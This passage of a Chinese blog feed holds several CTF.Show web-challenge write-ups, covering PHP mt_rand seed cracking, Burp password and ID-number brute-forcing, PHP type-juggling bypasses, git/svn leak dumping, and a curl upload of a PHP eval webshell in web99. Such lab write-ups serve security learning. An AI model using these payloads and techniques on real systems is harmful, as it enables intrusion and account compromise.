class="number">44.4</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x381e00cb</span> = <span class="number">941490379</span> (PHP <span class="number">7.1</span>.<span class="number">0</span>+)</span><br><span class="line">Found <span class="number">6</span>, trying <span class="number">0xfe000000</span> - <span class="number">0xffffffff</span>, speed <span class="number">42.3</span> Mseeds/s</span><br><span class="line">Found <span class="number">6</span></span><br></pre></td></tr></table></figure><p>由题目，我们的版本为7.3.11，可以看一下Found5和Found6，我们再来简单写一下php试试结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="number">725894259</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;r=&quot;</span> . mt_rand() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;token=&quot;</span> . (mt_rand() + mt_rand());</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// r=227011223</span></span><br><span class="line"><span class="comment">// token=1651918006</span></span><br></pre></td></tr></table></figure><p>很幸运，第一个就是正确的，我们成功拿到flag。</p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>这一题，很显然让我们爆破数据库的密码。有了上一次的经验，这次爆破他没给字典我也用他的字典了 -.-</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%205.png" alt="Untitled"></p><p>填写好example的信息，我们应该选择爆破的是数据库的密码，那就给密码加上payload，其他按照示例填写，并导入字典文件。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%206.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%207.png" alt="Untitled"></p><p>最后查看 Length 不同的一项，7758521 为密码，拿到flag。</p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>我们可以从网站底部获取一份录取名单，内容如下</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%208.png" alt="Untitled"></p><p>并且我们可以进入学生学籍信息查询系统，只需要爆破姓名和身份证号码。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%209.png" alt="Untitled"></p><p>我们以第一个为例。由于身份证这几位由年、月、日组成，实际上我们也不用从0爆破到99999999，只需要按照规律设置好就可以。比如说，我们可以将 Payload type 设置为 Dates，同时将格式 format 设置为 <code>yyyyMMdd</code> ，并将日期设置为从1995到2005。当然如果你有条件，你也可以在本地计算好符合校验码的身份证再提交，我这里就不折腾了，如下图</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2010.png" alt="Untitled"></p><p>然后我就将第一个从65年查到了05年，终于找到了他的生日 19900201 ，并且在弹窗中找到了他的学号和密码。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2011.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2012.png" alt="Untitled"></p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>我原本以为他是按照 0/1/2/3.txt 这样的顺序迭代下去的，然后发现它延长了 N 倍而且死循环了，我还以为等就好了，等了小几分钟发现原来是卡bug了（</p><p>看 Hint，发现原来是爆破前面两个目录，也不难理解 -.- 把 2.txt 去掉以后就是403错误页面，一般来说403错误就证明了存在这个目录，我们只需要爆破路径 {0-100}/{0-100} 即可，最终获得路径 72/20</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%2013.png" alt="Untitled"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web21&quot;&gt;&lt;a href=&quot;#web21&quot; class=&quot;headerlink&quot; title=&quot;web21&quot;&gt;&lt;/a&gt;web21&lt;/h1&gt;&lt;h2 id=&quot;做题&quot;&gt;&lt;a href=&quot;#做题&quot; class=&quot;headerlink&quot; title=&quot;做题&quot;&gt;&lt;/a&gt;做题&lt;/h2&gt;&lt;p&gt;首先先打开浏览器发送一次 HTTP 认证请求并抓包，将请求发送给 Intruder，并将此处添加为 payload&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html</id>
    <published>2021-08-30T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><code>PHP Version: 7.4.2</code></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul><li>请求参数可为数组</li></ul><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>我们将它的代码复制下来再修改一下，好好折磨折磨</p><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;fake_flag&#123;xxxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        print_r(<span class="variable">$num</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%201.png" alt="Untitled"></p><p>如果随便输入一个单词，那么判断条件 intval 将会为 0；但如果在单词中夹入数字，会被preg_match过滤。</p><p>但事实上，$_GET 里面这个 num 参数是可控的，它不仅仅可以是 int 或者 string， 还可以是 array。当 $num 为 array 时， preg_match 将无法发挥作用，并且 intval 在传入参数为数组时始终返回 1。通过下面代码进行测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&quot;m2222&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>, <span class="string">&quot;m223322&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>)); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>所以，只要传入参数中 key 为数组，具体实现方式为变量后面添加 [] ，就可以绕过正则判断，同时还能使 intval 始终为 1。得以拿到flag。</p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><ul><li>利用进制不同来绕开强类型判断</li><li>利用 intval 去掉小数点获得flag</li><li>利用 %00 截断参数</li><li>在数字后面添加任意字母拿到的都是数字</li><li>利用字符隔断某整数之后的数字</li></ul><h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我特意去翻了翻 intval 相关的参数代表着什么（<a href="https://www.runoob.com/php/php-intval-function.html">https://www.runoob.com/php/php-intval-function.html</a>），发现其中一句话写的就是</p><blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p></blockquote><p>好家伙，送分。</p><p>这题n个思路m个答案，</p><ul><li>十六进制的4476为 <code>0x117c</code> ，直接写入请求参数即可。（适用于 web92）</li><li>另一种是8进制，写入<code>010574</code>。（适用于 web92, web93）</li><li>还有一种是利用它整数性质，intval会将小数点去掉，参数写入 <code>4476.*</code> 即可获得flag。（适用于 web92, web93）</li><li>还有一种方法是在4476后面加入 <code>%00</code> ，成功绕过强类型判断</li><li>还有一种方法是在4476后面加乱七八糟的东西，应该和上一个原理差不多，比如<code>4476你爱我，我爱你，蜜雪冰城甜蜜蜜</code></li><li>对于 web94 ，第三个条件为判断0的位置，如果不存在0或者存在0放在第一个都会die，那就加一个符号将它隔断，比如 <code>4476;0</code></li></ul><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个判断最大的区别就是一个是 /im ， 一个是/i。我特地去查了一下这两个究竟有啥区别</p><blockquote><p>i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])<br>m modifier: multi line. Causes ^ and $ to match the begin/end of each line (not only begin/end of string)</p></blockquote><p>于是我在自己环境尝试替换了一下变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$a=$_GET[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;php\nphp&quot;</span>;</span><br></pre></td></tr></table></figure><p>结果不进下一个变量了。究其原因关键可能还在于这个 ^和$，也就导致它一行字符串只能出现 php，而 /im 允许出现多行， /i 只能在一行上出现，php\nphp满足了两行字符串均为php，而无法满足在一个字符串内全为php的条件。当然，这个$a可不能直接当参数，还得 urlencode 一下，最后结果为 <code>php%0Aphp</code></p><h1 id="web92-web94"><a href="#web92-web94" class="headerlink" title="web92~web94"></a>web92~web94</h1><p>见 web90</p><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><code>PHP Version: 7.3.11</code></p><p>兼容 web90, web92~web94, web95</p><h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p>这题中第一个判断条件使用了弱类型判断，隔绝了在4476后面加任意字符串的做法。</p><p>同时在第二个判断条件使用了小数点和字母判断，隔绝了使用小数或者十六进制的做法。</p><p>在第三个判断条件引入了判断0的位置，看似隔绝了八进制的做法，因为八进制的0是在第一个的，也就是位置为0，判断时0是false。</p><p>但是，我没想到八进制的0还可以不在第0位，只要在前面加个+或者空格就行。</p><p>使用  <code>010574</code> 或者<code>+010574</code> 即可获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><code>PHP Version: All</code></p><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><ul><li>绝对路径绕过</li></ul><h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%202.png" alt="Untitled"></p><p>随便输点东西可以获得其绝对路径 <code>/var/www/html</code>，然后将参数替换为 <code>/var/www/html/flag.php</code>即可获得flag。</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><code>PHP Version: All</code></p><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><ul><li>简单的 md5 碰撞</li></ul><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>参考资料：<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p><p>因为判断条件中等于号为强类型判断，所以原有的 a:QNKCDZO b:s878926199a 就不好用了。</p><p>但是利用上面的，请求参数是可以放一个数组的，我们尝试一下放一个数组会怎样，我们写一个简单的 PHP 程序来测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%203.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%204.png" alt="Untitled"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning: md5() expects parameter <span class="number">1</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /Users/kelly/Documents/Program/PHP/CTFShow/web97.php on line <span class="number">2</span></span><br></pre></td></tr></table></figure><p>经过简单调试后，我们发现 md5() 一个数组的话，会抛出异常，同时赋值的变量也会变为<code>null</code>。再看其中一个判断条件，<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code> </p><p>巧了吗不是，<code>null==null</code>，所以我们只需要在a参数和b参数上分别填上两个数组即可拿到flag。</p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p><code>PHP Version: All</code></p><h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><ul><li>指针</li></ul><h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>我们来分析一下这个代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先看highlight_file 这个最关键的，这个 $flag 应该就是从 flag.php 中拿出来的 flag，所以关键的就是要修改 $_GET[‘HTTP_FLAG’] 的值，来让它引入 $flag 从而产生报错。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>改POST为GET。我们可以看到，第一行中的 $_GET 就足以产生影响。所以我们可以先构造 POST 的参数为 HTTP_FLAG，再随便写一个 GET 参数，这样就可以看到报错信息拿到flag了。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%205.png" alt="Untitled"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>先将参数改POST为GET，再改为COOKIE。</p><p>由于第一步有一个置换 $_GET 的过程，也就是说你想修改 $_GET 变量就必定会执行 <code>$_GET?$_GET=&amp;_POST:&#39;flag&#39;;</code>，所以要使下一行<code>$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;</code>生效，POST的参数就必须有 flag:flag ，同时 <code>$_COOKIE[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;</code></p><p>最后curl请求为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: HTTP_FLAG=flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>套娃，先将参数改POST为GET，再改为COOKIE，再改Header。</p><p>前两步和之前一样，cookie改为 flag=flag，同时再在请求头加入 flag=flag，最后curl请求为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;flag: flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><p><code>PHP Version: All</code></p><h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>说实话，我真没搞懂这个要干啥，因为尝试了一下 233.php 加一句话木马就可以了。。。</p><p>然后我丢到 phpstorm 调试了一下，哦感情这是抽卡呢…</p><p>其实主要是因为这个for循环的范围太广了， <code>$i=36; $i &lt; 0x36d; $i++</code> 一共可以插800多个，运气好可以插到小数点和php的ascii码。不行就多试几次</p><p>参数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://2da731a5-dc75-499b-ae8f-ac7202e78130.challenge.ctf.show:8080/?n=233.php&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;content=&quot;&lt;?php eval($_POST[0]); ?&gt;&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>然后丢到 AntSword 里面看一下，里面有个 flag36d.php，打开就能拿到flag。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%206.png" alt="Untitled"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web89&quot;&gt;&lt;a href=&quot;#web89&quot; class=&quot;headerlink&quot; title=&quot;web89&quot;&gt;&lt;/a&gt;web89&lt;/h1&gt;&lt;p&gt;&lt;code&gt;PHP Version: 7.4.2&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;考点&quot;&gt;&lt;a href=&quot;#考点&quot; class=&quot;headerlink&quot; title=&quot;考点&quot;&gt;&lt;/a&gt;考点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;请求参数可为数组&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;做题&quot;&gt;&lt;a href=&quot;#做题&quot; class=&quot;headerlink&quot; title=&quot;做题&quot;&gt;&lt;/a&gt;做题&lt;/h2&gt;&lt;p&gt;我们将它的代码复制下来再修改一下，好好折磨折磨&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 信息收集 (Web补充)</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-Extension.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-Extension.html</id>
    <published>2021-08-02T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章为 Klee-CTF 专题</p></blockquote><h1 id="Web7-Plus"><a href="#Web7-Plus" class="headerlink" title="Web7-Plus"></a>Web7-Plus</h1><p>地址是：<a href="https://gitleak.tari.moe/">https://gitleak.tari.moe/</a>，首先用<a href="https://github.com/maurosoria/dirsearch#Installation--Usage">dirsearch</a>跑一下测试，结果如下</p><span id="more"></span><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled.png"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%201.png"></p><p>但是在这里，只拿到了一个index.html，感觉怪怪的</p><p>用 <a href="https://github.com/WangYihang/GitHacker">GitHacker</a> 重新试一下， <code>githacker --url [https://gitleak.tari.moe/.git/](https://gitleak.tari.moe/.git/) --folder result</code></p><p>拉下来文件以后，git log发现这里有个commit，然后使用 git diff 8d15 来查看修改内容</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%202.png"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%203.png"></p><p><code>flag&#123;761b8a9b-4250-4ac5-89c6-657c36f23dba&#125;</code></p><h1 id="web8-plus"><a href="#web8-plus" class="headerlink" title="web8-plus"></a>web8-plus</h1><p>dirscan 获取泄露路径</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%204.png"></p><p><code>python3 [SvnExploit.py](http://svnexploit.py/) -u [https://svnleak.tari.moe/.svn](https://svnleak.tari.moe/.svn) --dump</code></p><p>获取源码</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-collect-info-Extension/Untitled%205.png"></p><p>查看config.php获取flag</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章为 Klee-CTF 专题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Web7-Plus&quot;&gt;&lt;a href=&quot;#Web7-Plus&quot; class=&quot;headerlink&quot; title=&quot;Web7-Plus&quot;&gt;&lt;/a&gt;Web7-Plus&lt;/h1&gt;&lt;p&gt;地址是：&lt;a href=&quot;https://gitleak.tari.moe/&quot;&gt;https://gitleak.tari.moe/&lt;/a&gt;，首先用&lt;a href=&quot;https://github.com/maurosoria/dirsearch#Installation--Usage&quot;&gt;dirsearch&lt;/a&gt;跑一下测试，结果如下&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 信息收集</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info.html</id>
    <published>2021-08-02T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章为 Klee-CTF 专题</p></blockquote><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><span id="more"></span><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled.png"></p><p>右键查看源代码，发现flag</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>右键无法查看源代码，但你可以在地址栏添加 view-source:</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%201.png"></p><p>F12，藏在返回头部</p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>访问 /robots.txt 获得内容</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure><p>再访问 /flagishere.txt 获得flag</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%202.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%203.png"></p><p>题目提示 phps 源码泄漏，访问 /index.phps 试试</p><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%204.png" 